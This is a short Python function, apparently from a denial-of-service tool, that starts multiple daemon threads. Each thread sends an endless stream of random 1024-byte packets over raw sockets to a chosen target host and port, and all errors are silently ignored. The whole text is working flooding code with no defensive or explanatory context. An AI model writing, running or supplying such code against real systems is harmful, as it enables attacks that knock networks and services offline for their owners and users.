def raw_flood(target, port, requests, threads):
    import threading, socket, random

    def flood():
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
                s.sendto(random._urandom(1024), (target, port))
            except:
                pass

    print(f"[RAW] Sending raw packets to {target}:{port}")
    for _ in range(threads):
        t = threading.Thread(target=flood)
        t.daemon = True
        t.start()
